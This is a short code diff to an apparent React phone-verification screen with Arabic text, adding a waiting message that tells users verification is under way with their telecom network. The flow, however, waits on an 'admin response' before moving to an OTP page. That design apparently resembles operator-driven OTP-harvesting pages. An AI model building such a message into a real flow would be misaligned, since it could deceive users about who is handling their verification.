@@ -143,6 +143,7 @@ export default function PhoneVerification() {
       current: "توثيق رقم الجوال",
       nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
       waitingForAdminResponse: true,
+      customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
     });
   };
 
